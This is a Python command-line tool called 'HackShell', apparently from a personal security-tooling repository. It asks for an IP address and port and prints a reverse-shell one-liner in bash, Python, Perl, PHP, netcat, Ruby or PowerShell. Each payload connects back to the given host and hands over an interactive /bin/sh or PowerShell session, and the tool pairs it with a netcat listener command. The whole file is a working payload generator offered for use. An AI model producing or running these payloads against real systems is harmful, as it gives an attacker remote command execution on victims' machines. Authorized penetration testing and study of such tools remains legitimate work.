#!/usr/bin/env python3

# Import the colorama module for cross-platform colored output
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ASCII Art Header with Colors
print(Fore.GREEN + r"""
 _   _            _     ____  _          _ _ 
| | | | __ _  ___| | __/ ___|| |__   ___| | |
| |_| |/ _` |/ __| |/ /\___ \| '_ \ / _ \ | |
|  _  | (_| | (__|   <  ___) | | | |  __/ | |
|_| |_|\__,_|\___|_|\_\|____/|_| |_|\___|_|_|
""" + Style.RESET_ALL)

# Promotional Links
print(Fore.YELLOW + "=" * 62)
print("https://x.com/HckN1L")
print("https://github.com/HckN1L")
print("https://www.linkedin.com/in/HckN1L")
print("=" * 62 + Style.RESET_ALL)

# Reverse Shell Generator Functions with Netcat Listener
def generate_bash(ip, port):
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n[+] Netcat Listener: nc -lvnp {port}"

def generate_python(ip, port):
    return (f"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
            f"s.connect(('{ip}',{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); "
            f"p=subprocess.call(['/bin/sh','-i']);\n\n[+] Netcat Listener: nc -lvnp {port}")

def generate_perl(ip, port):
    return (f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
            f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'\n\n[+] Netcat Listener: nc -lvnp {port}")

def generate_php(ip, port):
    return (f"<?php $sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");?>"
            f"\n\n[+] Netcat Listener: nc -lvnp {port}")

def generate_nc(ip, port):
    return f"nc -e /bin/sh {ip} {port}\n\n[+] Netcat Listener: nc -lvnp {port}"

def generate_ruby(ip, port):
    return (f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n"
            f"\n[+] Netcat Listener: nc -lvnp {port}")

def generate_powershell(ip, port):
    return (f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
            f"{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = "
            f"(iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = "
            f"([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            f"$client.Close()\n\n[+] Netcat Listener: nc -lvnp {port}")

# Function to generate reverse shell and include netcat listener command
def generate_revshell(shell_type, ip, port):
    shells = {
        "bash": generate_bash,
        "python": generate_python,
        "perl": generate_perl,
        "php": generate_php,
        "nc": generate_nc,
        "ruby": generate_ruby,
        "powershell": generate_powershell
    }
    return shells.get(shell_type.lower(), lambda ip, port: "Unknown shell type!")(ip, port)

def main():
    ip = input("$ Enter the IP address: ")
    port = input("$ Enter the port number: ")

    print("\n[+] Reverse Shell Options:")
    print("1. Bash")
    print("2. Python")
    print("3. Perl")
    print("4. PHP")
    print("5. Netcat (nc)")
    print("6. Ruby")
    print("7. PowerShell\n")

    choice = input("Choose shell type [1-7]: ")

    shell_types = {
        "1": "bash",
        "2": "python",
        "3": "perl",
        "4": "php",
        "5": "nc",
        "6": "ruby",
        "7": "powershell"
    }

    shell_type = shell_types.get(choice)
    if shell_type:
        shell_code = generate_revshell(shell_type, ip, port)
        print(f"\n[+] {shell_type.capitalize()} Reverse Shell:\n")
        print(shell_code)
    else:
        print("[-] Invalid choice!")

if __name__ == "__main__":
    main()

